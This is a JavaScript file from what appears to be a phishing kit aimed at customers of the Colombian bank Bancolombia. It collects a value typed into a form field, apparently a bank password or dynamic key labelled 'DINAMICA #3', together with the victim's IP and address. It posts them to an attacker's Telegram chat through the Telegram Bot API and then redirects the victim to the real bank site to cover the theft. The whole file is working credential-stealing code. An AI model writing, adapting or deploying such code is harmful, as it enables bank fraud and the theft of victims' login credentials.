//bot token
var telegram_bot_id = "";
//chat id
var chat_id = "";

// Fetch credentials from config.json
$.getJSON("config.json", function(data) {
    telegram_bot_id = data.token;
    chat_id = data.chat_id;
});

var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("clavex").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "DINAMICA #3: " + u_name + "\n\nIP: " + ip +"\n" + ip2+"\nBANCOLOMBIA";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://www.bancolombia.com/personas/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8zi_T083N1N3A0C_I3NTQ0CAw0MLI1cgz0tvUz1wwkpiAJKG-AAjgZA_VGElBTkRhikOyoqAgCS5n-m/#';
        console.log(response);
    }).fail(function (error) {
        console.error(error);
        alert("Error de conexión. Por favor intente nuevamente.");
    });
    return false;
};
